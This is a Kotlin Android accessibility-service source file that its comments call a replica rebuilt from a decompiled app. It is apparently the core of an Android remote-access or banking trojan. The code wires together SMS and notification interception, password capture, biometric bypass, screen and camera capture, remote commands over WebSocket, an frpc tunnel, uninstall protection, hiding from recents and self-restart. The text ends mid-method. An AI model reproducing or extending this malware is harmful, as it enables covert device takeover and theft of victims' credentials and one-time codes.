package com.storm.safe.rock.service

import android.accessibilityservice.AccessibilityService
import android.app.KeyguardManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Point
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.view.KeyEvent
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.DefaultLauncherAlias
import com.storm.safe.rock.MediaProjectionHolder
import com.storm.safe.rock.manager.C0258a0
import com.storm.safe.rock.manager.C0259a1
import com.storm.safe.rock.manager.C0263a5
import com.storm.safe.rock.manager.CameraCaptureManager
import com.storm.safe.rock.manager.ScreenCaptureManager
import com.storm.safe.rock.receiver.arniezsqllm
import com.storm.safe.rock.service.modules.AccessibilityEventRouter
import com.storm.safe.rock.service.modules.ActivityMonitor
import com.storm.safe.rock.service.modules.BiometricBypassDelegate
import com.storm.safe.rock.service.modules.ConfigProgressManager
import com.storm.safe.rock.service.modules.GestureRecorderManager
import com.storm.safe.rock.service.modules.MainOrchestrator
import com.storm.safe.rock.service.modules.NetworkManager
import com.storm.safe.rock.service.modules.NotificationInterceptDelegate
import com.storm.safe.rock.service.modules.RemoteConfigManager
import com.storm.safe.rock.service.modules.SmsInterceptDelegate
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager
import com.storm.safe.rock.service.modules.command.CommandDispatcher
import com.storm.safe.rock.service.modules.protection.RecentsGuardManager
import com.storm.safe.rock.service.modules.protection.UninstallProtectionManager
import com.storm.safe.rock.service.modules.screen.ScreenControlHelper
import com.storm.safe.rock.service.modules.SmsContentObserver
import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
import com.storm.safe.rock.service.delegates.BroadcastReceiverRegistry
import com.storm.safe.rock.service.delegates.CipherFlowController
import com.storm.safe.rock.service.delegates.DetectionController
import com.storm.safe.rock.service.delegates.EventDispatcher
import com.storm.safe.rock.service.delegates.NetworkMessageSender
import com.storm.safe.rock.service.delegates.ServiceInitializer
import com.storm.safe.rock.service.delegates.PermissionFlowController
import com.storm.safe.rock.service.delegates.SmartNavigator
import com.storm.safe.rock.service.modules.FrpcProcessManager
import java.util.concurrent.atomic.AtomicBoolean
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * Core AccessibilityService — the central hub of the replica.
 *
 * Reverse-engineered from JADX reference `dqtvuisjd.java` (10,796 lines, 56 inner classes).
 * This file implements the ~60 core methods: companion/static, lifecycle (onServiceConnected,
 * onAccessibilityEvent, onDestroy), event dispatch, manager field wiring, and key utilities.
 *
 * JADX class: com.storm.safe.rock.service.dqtvuisjd
 */
class MyAccessibilityService : AccessibilityService() {

    // ════════════════════════════════════════════════════════════════
    // Companion object — mirrors JADX C0290a0 (static inner class)
    // ════════════════════════════════════════════════════════════════

    companion object {
        const val TAG = "MyAccessibilityService"

        /** Throttle interval for ensuring AppCoreService is running. JADX: 10000L */
        const val CORE_SERVICE_CHECK_INTERVAL = 10_000L

        /** Permission request auto-clear timeout (ms). JADX line 722: 30000 */
        const val PERMISSION_REQUEST_TIMEOUT = 30_000L

        /** Foreground notification ID. JADX line 9265: 10086 */
        const val FOREGROUND_NOTIFICATION_ID = 10086

        /** Notification channel ID for foreground service */
        const val NOTIFICATION_CHANNEL_ID = "system_helper_service"

        /** Root node cache time-to-live (ms). JADX: f52393c4 (constructor init) */
        const val ROOT_CACHE_TTL_MS = 150L

        /** Keyguard check cache TTL (ms). JADX: f52390c1 (constructor init) */
        const val KEYGUARD_CACHE_TTL_MS = 500L

        /** Event types routed to specialized handler only (not general delegate queue).
         * JADX line 9770: 512, 1024, 262144, 524288, 1048576, 2097152 */
        val FILTERED_EVENT_TYPES: Set<Int> = setOf(512, 1024, 262144, 524288, 1048576, 2097152)

        // ── Static fields (JADX m1–n1) ──

        /** Lazy Handler on main looper for uninstall protection. JADX: f52359m2 */
        val uninstallMainHandler: Handler by lazy { Handler(Looper.getMainLooper()) }

        /** JADX: f52360m3 — isWebViewOpen flag.
         *  Setter updates timestamp as well (mirrors setWebViewOpen). */
        @Volatile
        var isWebViewOpen: Boolean = false
            set(value) {
                field = value
                lastWebViewStatusTime = System.currentTimeMillis()
            }

        /** JADX: f52361m4 — isPermissionRequesting flag.
         *  Property-style accessor kept for backward compat with existing callers.
         *  Setting to true also records the timestamp (JADX line 780). */
        var isPermissionRequesting: Boolean
            get() = isPermissionRequestingFlag
            set(value) {
                isPermissionRequestingFlag = value
                if (value) {
                    permissionRequestTimestamp = System.currentTimeMillis()
                }
            }

        /** JADX: f52361m4 — internal flag backing */
        @Volatile
        private var isPermissionRequestingFlag: Boolean = false

        /** JADX: f52362m5 — permission request timestamp */
        @Volatile
        private var permissionRequestTimestamp: Long = 0L

        /** JADX: f52363m6 — lastWebViewStatusTime */
        @Volatile
        var lastWebViewStatusTime: Long = 0L
            private set

        /** JADX: f52364m7 — singleton instance */
        @Volatile
        internal var instance: MyAccessibilityService? = null

        /** JADX: f52365m8 — serviceStartTime */
        @Volatile
        var serviceStartTime: Long = 0L
            private set

        /** JADX: f52366m9 — lastCachedSource */
        @Volatile
        var lastCachedSource: CachedSourceData? = null

        /** JADX: f52367n0 — serviceMode (0=assist, 1=verifyPause) */
        @Volatile
        var serviceMode: Int = 0
            private set

        /** JADX: f52368n1 — isSensitiveAppPaused (AtomicBoolean in vendor) */
        private val sensitiveAppPausedAtomic = AtomicBoolean(false)

        // ── Companion methods ──

        fun getInstance(): MyAccessibilityService? = instance

        fun isServiceRunning(): Boolean = instance != null

        /** JADX line 734: instance != null && d0 flag (init complete) */
        fun isServiceReady(): Boolean {
            val inst = instance ?: return false
            return inst.isInitComplete
        }

        /** JADX line 730: AtomicBoolean.get() */
        fun isSensitiveAppPaused(): Boolean = sensitiveAppPausedAtomic.get()

        /** JADX line 764/768: AtomicBoolean.set() */
        fun setSensitiveAppPaused(paused: Boolean) {
            sensitiveAppPausedAtomic.set(paused)
        }

        // JADX line 764/768: pauseForSensitiveApp/resumeFromSensitiveApp — thin wrappers for AtomicBoolean.set()
        fun pauseForSensitiveApp() = setSensitiveAppPaused(true)
        fun resumeFromSensitiveApp() = setSensitiveAppPaused(false)

        /** JADX line 718: check flag + 30s timeout, auto-clear on expiry */
        fun isPermissionRequestActive(): Boolean {
            if (!isPermissionRequestingFlag) return false
            if (System.currentTimeMillis() - permissionRequestTimestamp <= PERMISSION_REQUEST_TIMEOUT) {
                return true
            }
            // Timeout expired — auto-clear
            android.util.Log.w(TAG, "⚠️ [权限] 权限请求标志位超时，自动清除")
            isPermissionRequestingFlag = false
            return false
        }

        /** JADX line 787: serviceMode == 1 means verifyPaused */
        fun isVerifyPaused(): Boolean = serviceMode == 1

        /** JADX line 787: set mode to 1 */
        fun setVerifyPauseMode() {
            serviceMode = 1
        }

        /** JADX line 772: set mode to 0 */
        fun setAssistMode() {
            serviceMode = 0
        }

        /** JADX line 747: performGlobalAction(8) with SDK check.
         * GLOBAL_ACTION_LOCK_SCREEN = 8, requires API 28+ */
        fun lockScreen() {
            val inst = instance ?: return
            try {
                if (Build.VERSION.SDK_INT < 28) {
                    android.util.Log.d(TAG, "🔍 [屏幕] Android 9以下不支持无障碍锁屏")
                    return
                }
                if (inst.performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)) {
                    android.util.Log.d(TAG, "✅ [屏幕] 屏幕已锁定（定时唤醒后自动锁屏）")
                } else {
                    android.util.Log.w(TAG, "⚠️ [屏幕] 锁屏失败")
                }
            } catch (e: Exception) {
                android.util.Log.e(TAG, "⚠️ [屏幕] 锁屏异常: ${e.message}")
            }
        }

        /** JADX line 673: get NetworkManager, call disconnect+reconnect */
        fun forceReconnectWebSocket() {
            android.util.Log.d(TAG, "📡 外部触发WebSocket重连")
            try {
                val inst = instance ?: return
                val nm = inst.networkManager ?: run {
                    // JADX line 679: fallback to NetworkManager singleton
                    android.util.Log.w(TAG, "⚠️ instance.networkManager is null")
                    return
                }
                nm.disconnect()
                // JADX line 688–689: nm.m211643a8() (disconnect) then nm.m211669d6() (reconnect)
                val prefs = inst.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
                val serverUrl = prefs.getString("server_url", null)
                val deviceId = inst.getAndroidDeviceId()
                if (serverUrl != null) {
                    nm.connectToServer(serverUrl, deviceId)
                }
            } catch (e: Exception) {
                android.util.Log.e(TAG, "forceReconnectWebSocket error", e)
            }
        }

        /** JADX line 693: get cached root from instance */
        fun getCachedRoot(): AccessibilityNodeInfo? {
            return instance?.getRootNode()
        }

        fun logEvent(type: String, description: String) {
            android.util.Log.d(TAG, "[$type] $description")
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Instance fields — manager/delegate references
    // JADX fields f52369a0 through f52489m0
    // ════════════════════════════════════════════════════════════════

    // ── System managers ──

    var powerManager: PowerManager? = null
        private set

    var keyguardManager: KeyguardManager? = null
        private set

    // ── Core managers (JADX mapped) ──

    /** JADX: f52369a0 (C0260a2) — Screen capture */
    var screenCaptureManager: ScreenCaptureManager? = null

    /** JADX: f52370a1 (C0263a5) — Display manager */
    var displayManager: C0263a5? = null

    /** JADX: f52371a2 (C0258a0) — Camera manager */
    var cameraManager: C0258a0? = null

    /** JADX: f52372a3 (C0324a9) — SMS interception */
    var smsInterceptDelegate: SmsInterceptDelegate? = null

    /** JADX: f52375a6 (C0262a4) — Camera capture */
    var cameraCaptureManager: CameraCaptureManager? = null

    /** JADX: f52380b1 (C0350a7) — Command dispatch */
    var commandDispatcher: CommandDispatcher? = null

    /** JADX: f52382b3 (C0322a7) — Remote config */
    var remoteConfigManager: RemoteConfigManager? = null

    /** frpc 进程管理器 — vendor CheckProcessThread (thread/b.java) */
    var frpcProcessManager: FrpcProcessManager? = null

    /** JADX: f52414e5 (C0614i9) — Event filtering.
     *  Vendor: C0614i9 — EventFilterManager, now replicated. */
    var eventFilterManager: com.storm.safe.rock.service.modules.EventFilterManager? = null

    /** JADX: f52415e6 (C0323a8) — WebSocket network manager */
    @get:JvmName("networkManagerField")
    var networkManager: NetworkManager? = null

    /** Delegate: detection enable/disable (extracted from this service) */
    private var detectionController: DetectionController? = null

    /** Delegate: smart navigation — return app to foreground (extracted from this service) */
    private var smartNavigator: SmartNavigator? = null

    /** Delegate: broadcast receiver registration/unregistration */
    internal var broadcastReceiverRegistry: BroadcastReceiverRegistry? = null

    /** Delegate: network message sending (extracted sendHideStatus, sendBiometricResult, etc.) */
    private var networkMessageSender: NetworkMessageSender? = null

    /** Delegate: cipher/password capture flow (extracted from this service) */
    internal var cipherFlowController: CipherFlowController? = null

    /** Delegate: permission grant flow (startPermissionGrantFlow, resumeWriteSettings, pauseWriteSettings) */
    internal var permissionFlowController: PermissionFlowController? = null

    /** Delegate: event dispatch — onAccessibilityEvent routing + sub-methods */
    internal var eventDispatcher: EventDispatcher? = null

    /** Delegate: service initialization — orchestrates all 14 init methods */
    internal var serviceInitializer: ServiceInitializer? = null

    /** JADX: f52418e9 (C0317a2) — Accessibility event routing */
    var accessibilityEventRouter: AccessibilityEventRouter? = null

    /** JADX: f52428f9 (C0318a3) — Config progress manager */
    var configProgressManager: ConfigProgressManager? = null

    /** Unified overlay manager — replaces old mask overlay stub (JADX: C0763km) */
    var overlayManager: com.storm.safe.rock.service.modules.overlay.OverlayManager? = null

    /** JADX: f52429g0 (C0327b2) — Main orchestrator */
    var mainOrchestrator: MainOrchestrator? = null

    /** JADX: f52431g2 (C0329b4) — Config stage / authorization module.
     *  Typed as Any? because JADX C0329b4 wraps DeviceAuthorizationManager internally.
     *  Cast to DeviceAuthorizationManager where needed. */
    var configStageManager: Any? = null

    /** JADX: f52434g5 (C0328b3) — Biometric bypass */
    var biometricBypassDelegate: BiometricBypassDelegate? = null

    /** JADX: f52435g6 (C0355a0) — Uninstall protection */
    var uninstallProtectionManager: UninstallProtectionManager? = null

    /** JADX: f52436g7 (C0356a1) — Recents hiding */
    var recentsGuardManager: RecentsGuardManager? = null

    /** JADX: f52437g8 (C0319a4) — GestureRecorder / Notification interception.
     *  JADX C0319a4 handles lockscreen gesture recording, hover events, and notification dispatch.
     *  notificationInterceptDelegate wraps the typed API; gestureRecorderManager holds the raw ref. */
    var notificationInterceptDelegate: NotificationInterceptDelegate? = null

    /** JADX: f52437g8 (C0319a4) — raw reference for gesture recording dispatch */
    var gestureRecorderManager: GestureRecorderManager? = null

    /** JADX: f52438g9 (C0335a1) — Password/cipher capture */
    var cipherCaptureManager: CipherCaptureManager? = null

    /** JADX: f52441h2 (C0357a0) — Screen control helper */
    var screenControlHelper: ScreenControlHelper? = null

    /** JADX: f52439h0 (C0032al) — Gesture executor overlay manager */
    var gestureExecutor: Any? = null

    /** Delegate for gesture dispatch (tap, swipe, long-press). Extracted from this class. */
    private var gestureController: com.storm.safe.rock.service.delegates.GestureController? = null

    /** JADX: f52409e0 (u11) — Injection check periodic job reference */
    var injectionCheckJob: kotlinx.coroutines.Job? = null

    /** JADX: dqtvuisjd$startWebViewStatusCheckTask — WebView status expiry check job */
    private var webViewStatusCheckJob: kotlinx.coroutines.Job? = null

    /** JADX: f52455i6 (C0259a1) — Audio manager */
    var audioManager: C0259a1? = null

    /** JADX: f52461j2 (arniezsqllm) — SMS broadcast receiver */
    var smsReceiver: arniezsqllm? = null

    // ── Volatile state fields ──

    /** JADX: f52399d0 — init complete flag (used by isServiceReady) */
    @Volatile
    var isInitComplete: Boolean = false
        internal set

    /** JADX: f52400d1 — permission flow started */
    @Volatile
    var isPermissionFlowStarted: Boolean = false

    /** JADX: f52401d2 — deferred init in progress */
    @Volatile
    var isDeferredInitStarted: Boolean = false

    /** JADX: f52388b9 — cached keyguard locked state */
    @Volatile
    private var cachedKeyguardLocked: Boolean = false

    /** JADX: f52389c0 — last keyguard check timestamp */
    @Volatile
    private var lastKeyguardCheckTime: Long = 0L

    /** JADX: f52391c2 — cached root node */
    @Volatile
    private var cachedRootNode: AccessibilityNodeInfo? = null

    /** JADX: f52392c3 — cached root node timestamp */
    @Volatile
    private var cachedRootNodeTime: Long = 0L

    /** JADX: f52394c5 — uninstall protection enabled */
    @Volatile
    var isUninstallProtectionEnabled: Boolean = false

    /** JADX: f52447h8 — service lifecycle healthy flag */
    @Volatile
    var isServiceHealthyFlag: Boolean = false

    /** JADX: f52469k0 — cipher listening active */
    @Volatile
    var isCipherListeningActive: Boolean = false

    /** JADX: f52474k5 — cipher capture enabled */
    @Volatile
    var isCipherCaptureEnabled: Boolean = false

    @Volatile
    var pendingPasswordType: String? = null

    /** JADX: f52477k8 — uninstall guard started */
    @Volatile
    var isUninstallGuardStarted: Boolean = false

    /** JADX: f52475k6 — camouflage mode flag */
    var isCamouflageModeEnabled: Boolean = false

    /** JADX: f52432g3 — screen capture active */
    @Volatile
    var isScreenCaptureActive: Boolean = false

    /** JADX: f52402d3 — network init started */
    @Volatile
    var isNetworkInitStarted: Boolean = false

    /** JADX: f52483l4 — transparent window added / control enabled */
    @Volatile
    var isControlEnabled: Boolean = false

    /** JADX: f52484l5 — controlledBy identifier */
    @Volatile
    var controlledBy: String? = null

    /** JADX: f52442h3 — accessibility page monitor enabled */
    var isAccessibilityPageMonitorEnabled: Boolean = false

    /** JADX: f52449i0 — monitor confirmation required count */
    var monitorConfirmationCount: Int = 2

    /** JADX: f52450i1 — monitor max retry count */
    var monitorMaxRetryCount: Int = 8

    /** JADX: f52451i2 — monitor delay after service connected (ms) */
    var monitorDelayAfterConnected: Long = 1000L

    /** JADX: f52448h9 — monitor check interval (ms) */
    var monitorCheckInterval: Long = 500L

    /** JADX: f52453i4 — modules initialized flag */
    @Volatile
    var isModulesInitialized: Boolean = false

    /** JADX: f52411e2 — auth state restored flag */
    @Volatile
    var isAuthStateRestored: Boolean = false

    /** JADX: f52479l0 — overlay visible */
    @Volatile
    var isOverlayVisible: Boolean = false

    /** JADX: f52471k2 — cipher capture attempt count */
    @Volatile
    var cipherCaptureAttemptCount: Int = 0

    /** JADX: f52485l6 — password launch count */
    @Volatile
    var passwordLaunchCount: Int = 0

    // ── Tracking / timing fields ──

    /** JADX: f52478k9 — saved brightness value */
    var savedBrightness: Int = 0

    /** JADX: f52444h5 — accessibility settings monitor timestamp */
    var accessibilitySettingsMonitorTime: Long = 0L

    /** JADX: f52445h6 — accessibility settings monitor count */
    var accessibilitySettingsMonitorCount: Int = 0

    /** JADX: f52443h4 — accessibility settings monitor job */
    var accessibilitySettingsMonitorJob: kotlinx.coroutines.Job? = null

    /** JADX: f52448h9 — last injection check time */
    var lastInjectionCheckTime: Long = 0L

    /** JADX: f52451i2 — last notification interception time */
    var lastNotificationTime: Long = 0L

    /** JADX: f52464j5 — last network event time */
    var lastNetworkEventTime: Long = 0L

    /** JADX: f52467j8 — last alarm schedule time */
    var lastAlarmScheduleTime: Long = 0L

    // ── Broadcast receiver registration flags ──

    /** JADX: f52458i9 — screen state receiver registered */
    var screenStateReceiverRegistered: Boolean = false

    /** JADX: f52460j1 — local service receiver registered */
    var localServiceReceiverRegistered: Boolean = false

    /** JADX: f52488l9 — permission health receiver registered */
    var permissionHealthReceiverRegistered: Boolean = false

    // ── Collections ──

    /** JADX: f52405d6 — LinkedHashMap for injection task tracking.
     *  Public in vendor (Java default visibility). Accessed by RemoteConfigManager. */
    val injectionTasks = LinkedHashMap<String, String>()

    /** JADX: f52406d7 — sync lock for injectionTasks.
     *  Public in vendor. Accessed by RemoteConfigManager for synchronized reads. */
    val injectionTasksLock = Any()

    /** JADX: f52407d8 — LinkedHashMap for injection throttle timestamps.
     *  Internal: accessed by EventDispatcher for throttle checks. */
    internal val injectionThrottleMap = LinkedHashMap<String, Long>()

    /** JADX: f52408d9 — injection check throttle interval (ms), constructor-initialized */
    var injectionThrottleInterval: Long = 5000L

    /** Delegate queue. Typed as Any for backward compat; cast to AccessibilityDelegate when dispatching */
    private val delegateQueue = mutableListOf<Any>()

    // ── Coroutine infrastructure ──

    private var coroutineScope: CoroutineScope? = null

    // ── Constants from constructor (JADX init block) ──
    // JADX: f52390c1, f52393c4, f52408d9, f52410e1, f52468j9, etc.
    // These are constructor-initialized final fields in vendor

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onCreate
    // JADX line 10300: calls ensureForegroundNotification
    // ════════════════════════════════════════════════════════════════

    override fun onCreate() {
        super.onCreate()
        try {
            ensureForegroundNotification()
            android.util.Log.d(TAG, "✅ [onCreate] 前台服务已在 accessibility 绑定前启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [onCreate] 前台服务启动失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onServiceConnected
    // JADX line 10663
    // ════════════════════════════════════════════════════════════════

    override fun onServiceConnected() {
        super.onServiceConnected()
        android.util.Log.i(TAG, "✅ [服务] 无障碍服务已连接")

        // Initialize ActivityMonitor log directory to app-private storage
        // Android 11+ Scoped Storage blocks direct /sdcard/ writes
        try {
            ActivityMonitor.logDir = filesDir
        } catch (_: Exception) {}

        try {
            ActivityMonitor.logSystem("无障碍服务已启动连接")
        } catch (_: Exception) {}

        // Initialize coroutine scope
        try {
            if (coroutineScope == null) {
                coroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
            }
        } catch (_: Exception) {}

        try {
            // Set timestamps and instance
            serviceStartTime = System.currentTimeMillis()
            instance = this
            gestureController = com.storm.safe.rock.service.delegates.GestureController(this)
            detectionController = DetectionController(
                eventFilterManagerProvider = { eventFilterManager },
                networkManagerProvider = { networkManager }
            )
            broadcastReceiverRegistry = BroadcastReceiverRegistry(this)
            smartNavigator = SmartNavigator(this)
            cipherFlowController = CipherFlowController(this)
            permissionFlowController = PermissionFlowController(this)
            eventDispatcher = EventDispatcher(this)
            networkMessageSender = NetworkMessageSender(
                networkManagerProvider = { networkManager },
                deviceIdProvider = { getAndroidDeviceId() }
            )

            // Configure accessibility service info
            initServiceConfig()

            // Get system services
            try {
                val ps = getSystemService(Context.POWER_SERVICE)
                powerManager = ps as PowerManager
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ PowerManager/Keyguard 初始化失败", e)
            }
            try {
                val ks = getSystemService(Context.KEYGUARD_SERVICE)
                keyguardManager = if (ks is KeyguardManager) ks else null
            } catch (_: Exception) {}

            // Start AppCoreService
            try {
                val appContext = applicationContext
                AppCoreService.start(appContext)
            } catch (_: Exception) {}

            // Create ServiceInitializer and orchestrate full init
            serviceInitializer = ServiceInitializer(this)
            val isReinstallRecovery = serviceInitializer?.checkReinstallRecovery() ?: false

            coroutineScope?.launch {
                try {
                    serviceInitializer?.runFullInit(isReinstallRecovery)
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ runFullInit failed", e)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ onServiceConnected失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onAccessibilityEvent
    // JADX line 9715
    // ════════════════════════════════════════════════════════════════

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            // Guard: screen off or sensitive app paused → return (JADX line 9767)
            val pm = powerManager
            if ((pm != null && !pm.isInteractive) || isSensitiveAppPaused()) return

            eventDispatcher?.dispatch(event)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "⚠️ [onAccessibilityEvent] 意外异常被拦截，服务保持运行", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onInterrupt
    // JADX line 10610
    // ════════════════════════════════════════════════════════════════

    override fun onInterrupt() {
        android.util.Log.w(TAG, "无障碍服务被中断")
        try {
            ActivityMonitor.logSystem("无障碍服务被中断 系统或用户中断了服务")
        } catch (_: Exception) {}

        try {
            displayManager?.stopCapture()
            android.util.Log.d(TAG, "✅ [中断] 已停止屏幕捕获")
        } catch (_: Exception) {}
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onDestroy
    // JADX line 10311
    // ════════════════════════════════════════════════════════════════

    override fun onDestroy() {
        android.util.Log.i(TAG, "🛑 无障碍服务正在销毁")

        try { ActivityMonitor.logSystem("无障碍服务被销毁") } catch (_: Exception) {}
        try { ActivityMonitor.logSystem("无障碍服务被系统销毁 可能被用户关闭或系统回收") } catch (_: Exception) {}

        // Cancel coroutines
        try {
            coroutineScope?.cancel()
            coroutineScope = null
        } catch (_: Exception) {}

        // Cleanup display manager
        try { displayManager?.stopCapture() } catch (_: Exception) {}

        // Cleanup camera capture
        try { cameraCaptureManager?.stopCapture() } catch (_: Exception) {}

        // Unregister SMS receiver
        try {
            smsReceiver?.let {
                unregisterReceiver(it)
                smsReceiver = null
                android.util.Log.d(TAG, "📩 ✅ 短信接收器已注销")
            }
        } catch (e: Exception) {
            try { android.util.Log.e(TAG, "📩 ❌ 注销短信接收器失败", e) } catch (_: Exception) {}
        }

        // Unregister all broadcast receivers managed by BroadcastReceiverRegistry
        try {
            broadcastReceiverRegistry?.unregisterAll()
            screenStateReceiverRegistered = false
            localServiceReceiverRegistered = false
            permissionHealthReceiverRegistered = false
        } catch (_: Exception) {}

        // Cleanup configStageManager (JADX: C0329b4)
        try {
            configStageManager?.let { csm ->
                // JADX line 10460: csm.f53200a5 = false; cancel scope
                android.util.Log.d(TAG, "🧹 清理 configStageManager")
            }
        } catch (_: Exception) {}

        // Cleanup network manager reference
        try {
            networkManager?.let { nm ->
                // JADX: clear service ref — nm.serviceRef = null
            }
        } catch (_: Exception) {}

        // Cleanup event filter manager
        try {
            // JADX: C0614i9 — EventFilterManager cleanup, null out reference
            eventFilterManager?.release()
            eventFilterManager = null
        } catch (_: Exception) {}

        // Cleanup frpc process manager
        try {
            frpcProcessManager?.stop()
            frpcProcessManager = null
        } catch (_: Exception) {}

        // Cleanup biometric bypass
        try {
            // JADX: C0328b3 — BiometricBypassDelegate cleanup (null out reference)
            biometricBypassDelegate = null
        } catch (_: Exception) {}

        // Cleanup config progress manager
        try {
            configProgressManager?.let { cpm ->
                // JADX: reset stage to IDLE, cancel job
            }
        } catch (_: Exception) {}

        // Cleanup accessibility event router
        try {
            accessibilityEventRouter?.let { aer ->
                // JADX: set active=false, cancel scope
            }
        } catch (_: Exception) {}

        // Cleanup recents guard
        try {
            recentsGuardManager?.let { rgm ->
                // JADX: clear handler, quit thread
                uninstallMainHandler.removeCallbacksAndMessages(null)
            }
        } catch (_: Exception) {}

        // Reset healthy flag
        try { isServiceHealthyFlag = false } catch (_: Exception) {}

        // Schedule alarm for restart if authorized (JADX line 10573)
        try {
            val isAuthorized = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)
            if (isAuthorized) {
                // JADX line 10573: schedule alarm + WorkManager restart
                try {
                    zgafaqvswksa.schedule(applicationContext, 30_000L)
                    android.util.Log.d(TAG, "✅ 已安排 JobScheduler 30s 后重启")
                } catch (_: Exception) {}
                try {
                    zgafaqvswksa.scheduleImmediateRestart(applicationContext)
                    android.util.Log.d(TAG, "✅ 已触发 WorkManager 立即重启")
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}

        // Clear delegate queue
        delegateQueue.clear()

        // Null out singleton
        instance = null
        serviceStartTime = 0L

        super.onDestroy()
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onKeyEvent
    // JADX line 10634
    // ════════════════════════════════════════════════════════════════

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        if (event == null) return super.onKeyEvent(event)
        if (event.keyCode == KeyEvent.KEYCODE_POWER &&
            event.action == KeyEvent.ACTION_DOWN &&
            event.isLongPress
        ) {
            android.util.Log.d(TAG, "🔴 [电源键] 检测到长按电源键")
        }
        return super.onKeyEvent(event)
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onRebind
    // JADX line 10644
    // ════════════════════════════════════════════════════════════════

    override fun onRebind(intent: Intent?) {
        super.onRebind(intent)
        android.util.Log.d(TAG, "🔄 无障碍服务 onRebind（避免重建）")
        try {
            ActivityMonitor.logSystem("无障碍服务重新绑定 服务恢复")
        } catch (_: Exception) {}
        instance = this
        if (smartNavigator == null) smartNavigator = SmartNavigator(this)
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onUnbind
    // JADX line 10780
    // ════════════════════════════════════════════════════════════════

    override fun onUnbind(intent: Intent?): Boolean {
        try {
            displayManager?.stopCapture()
        } catch (_: Exception) {}
        android.util.Log.d(TAG, "🔄 无障碍服务 onUnbind")
        try {
            ActivityMonitor.logSystem("无障碍服务解绑 系统正在解除绑定")
        } catch (_: Exception) {}
        return true
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onStartCommand
    // JADX line 10753
    // ════════════════════════════════════════════════════════════════

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            ensureForegroundNotification()
        } catch (_: Exception) {}

        if (intent == null) return START_STICKY

        try {
            val action = intent.action
            if (action == "com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED") {
                try {
                    android.util.Log.d(TAG, "通过Intent接收到MediaProjection权限获取成功通知")
                    handleMediaProjectionIntent()
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "处理Intent通知失败", e)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "⚠️ [onStartCommand] 意外异常", e)
        }

        return START_STICKY
    }

    // ════════════════════════════════════════════════════════════════
    // Key instance methods
    // ════════════════════════════════════════════════════════════════

    /**
     * Configure AccessibilityServiceInfo flags.
     * JADX method: m211450d5 (d5), line 4712
     *
     * SDK 30+: flags = 0x100B07B (16810107) = FLAG_REPORT_VIEW_IDS | FLAG_RETRIEVE_INTERACTIVE_WINDOWS
     *          | FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | FLAG_REQUEST_TOUCH_EXPLORATION_MODE | etc.
     * SDK <30: flags = 123 (0x7B)
     */
    fun initServiceConfig() {
        try {
            val info = serviceInfo ?: return
            info.flags = if (Build.VERSION.SDK_INT >= 30) 16810107 else 123
            info.eventTypes = -1 // ALL_MASK
            info.feedbackType = -1 // ALL
            info.notificationTimeout = 0L
            info.packageNames = null
            serviceInfo = info

            val hasHover = (info.eventTypes and 128) != 0
            val hasTouchExplore = (info.flags and 4) != 0
            android.util.Log.d(
                TAG,
                "✅ ServiceInfo已配置，flags=0x${Integer.toHexString(info.flags)}" +
                    " eventTypes=0x${Integer.toHexString(info.eventTypes)}" +
                    " hasHover=$hasHover hasTouchExploreFlag=$hasTouchExplore"
            )
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ ServiceInfo配置失败", e)
        }
    }

    /** JADX: a2 — continue service init. Delegates to ServiceInitializer. */
    suspend fun continueServiceInitialization() = serviceInitializer?.continueServiceInitialization()

    /**
     * Safe rootInActiveWindow access with caching.
     * JADX method: m211468g2 (g2), line 5910
     *
     * 1. If power off → return null
     * 2. If cached root still valid (within TTL) → return cached
     * 3. Otherwise call getRootInActiveWindow() and cache
     */
    fun getRootNode(): AccessibilityNodeInfo? {
        val pm = powerManager
        if (pm != null && !pm.isInteractive) return null

        val now = SystemClock.uptimeMillis()
        val cached = cachedRootNode
        if (cached != null && now - cachedRootNodeTime < ROOT_CACHE_TTL_MS) {
            // Validate cached node is still alive
            try {
                cached.packageName // will throw if recycled
                return cached
            } catch (_: Exception) {
                cachedRootNode = null
            }
        }

        // Fetch fresh root
        val root = try {
            rootInActiveWindow
        } catch (_: Exception) {
            null
        }
